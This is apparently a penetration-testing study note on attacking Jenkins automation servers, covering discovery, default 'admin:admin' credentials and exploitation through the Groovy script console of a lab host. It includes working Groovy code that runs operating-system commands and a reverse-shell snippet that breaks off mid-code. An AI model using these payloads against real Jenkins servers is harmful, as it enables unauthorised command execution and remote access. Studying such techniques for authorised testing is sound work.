---
title: Jenkins
aliases: []
tags:
- study-notes/alias-files
- technique/t1190
- technique/t1110
- tool/nmap
- tool/curl
- tool/nc
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: jenkins.md
related_tools:
- '[[nmap]]'
- '[[curl]]'
- '[[nc]]'
related_techniques:
- '[[t1190]]'
- '[[t1110]]'
related_tactics:
- '[[ta0003]]'
related_services:
- '[[apache-tomcat]]'
related_os: []
related_notes: []
mitre_tactic: TA0003
mitre_technique: T1190, T1110
real_path: ''
port: 8080, 5000
protocol: http, tcp
os: ''
---

# Jenkins

## Description
Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It runs in servlet containers such as Tomcat.

## Discovery
- Runs on [[apache-tomcat]] port 8080 by default
- Distinctive login screen
- Port 5000 is used to communicate between masters and slave servers
- Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all.
- Administrators can allow or disallow users from creating accounts.
- Default credentials: `admin:admin`

## Enumeration
No specific enumeration steps provided.

## Attack
- Via the script console `http://jenkins.inlanefreight.local:8000/script` #language/groovy
  - Open script console
  - Execute command
    ```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
    ```
  - Reverse shell
    ```groovy
    r = Runtime.getRuntime()
p = r.exec([

